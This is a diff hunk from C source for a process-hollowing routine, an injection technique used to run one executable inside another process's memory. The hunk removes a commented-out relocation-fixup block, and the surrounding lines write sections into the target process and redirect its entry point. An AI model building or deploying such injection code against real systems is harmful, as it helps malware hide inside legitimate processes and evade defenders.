@@ -80,52 +80,6 @@ BOOL HollowingProces(char* targetExe, char* replaceExe){
 		WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)lpNewTargetImageBaseAddress + pSecH->VirtualAddress), (PVOID)((LPBYTE)lpImageBase + pSecH->PointerToRawData), pSecH->SizeOfRawData, NULL);
 	}
 
-    // // Fix reloc
-	// LPVOID lpModule = lpNewTargetImageBaseAddress;
-	// UINT_PTR deltaBase = (UINT_PTR)lpModule - pNtH->OptionalHeader.ImageBase;
-	// PIMAGE_DATA_DIRECTORY pDataDirecotry = (PIMAGE_DATA_DIRECTORY)(&pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
-    // PIMAGE_BASE_RELOCATION pRelocTable = NULL;
-    // SIZE_T nRelocBlockNum = 0;
-    // PIMAGE_RELOC pRelocBlock = NULL;
-    // UINT_PTR relocValue;
-	// if (pDataDirecotry->Size > 0)
-	// {
-    //     for (SIZE_T i = 0; i <pNtH->FileHeader.NumberOfSections; i++)
-	//     {
-	//     	pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)lpImageBase + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
-    //         if (pDataDirecotry->VirtualAddress >= pSecH->VirtualAddress && pDataDirecotry->VirtualAddress <= (pSecH->VirtualAddress + pSecH->Misc.VirtualSize)){
-    //             pRelocTable = (PIMAGE_BASE_RELOCATION)(pDataDirecotry->VirtualAddress - pSecH->VirtualAddress + pSecH->PointerToRawData + (UINT_PTR)lpImageBase);
-    //             break;
-    //         }
-	//     }
-        
-	// 	while (pRelocTable->SizeOfBlock)
-	// 	{
-	// 		nRelocBlockNum = (pRelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
-	// 		pRelocBlock = (PIMAGE_RELOC)((UINT_PTR)pRelocTable + sizeof(IMAGE_BASE_RELOCATION));
-	// 		for (size_t i = 0; i < nRelocBlockNum; i++)
-	// 		{
-	// 			PUINT_PTR pRelocAddr = (PUINT_PTR)((UINT_PTR)lpModule + pRelocTable->VirtualAddress + pRelocBlock[i].offset);
-	// 			if (pRelocBlock[i].type == IMAGE_REL_BASED_HIGHLOW || pRelocBlock[i].type == IMAGE_REL_BASED_DIR64)
-	// 			{
-	// 				// *pRelocAddr += deltaBase;
-    //                 ReadProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
-    //                 relocValue += deltaBase;
-    //                 WriteProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
-	// 			}
-	// 			else if (pRelocBlock[i].type == IMAGE_REL_BASED_HIGH || pRelocBlock[i].type == IMAGE_REL_BASED_LOW)
-	// 			{
-	// 				//*pRelocAddr += HIWORD(deltaBase);
-    //                 ReadProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
-    //                 relocValue += HIWORD(deltaBase);
-    //                 WriteProcessMemory(pi.hProcess, (LPVOID)pRelocAddr, &relocValue, sizeof(relocValue), NULL);
-	// 			}
-	// 		}
-	// 		// Next
-	// 		pRelocTable = (PIMAGE_BASE_RELOCATION)((UINT_PTR)pRelocTable + pRelocTable->SizeOfBlock);
-	// 	}
-	// }
-
 #if defined(_M_X64) // _M_AMD64
 	context.Rcx = (SIZE_T)((LPBYTE)lpNewTargetImageBaseAddress + pNtH->OptionalHeader.AddressOfEntryPoint);
 	printf("[+] RCX => Entry point: %#zx\n", context.Rcx);
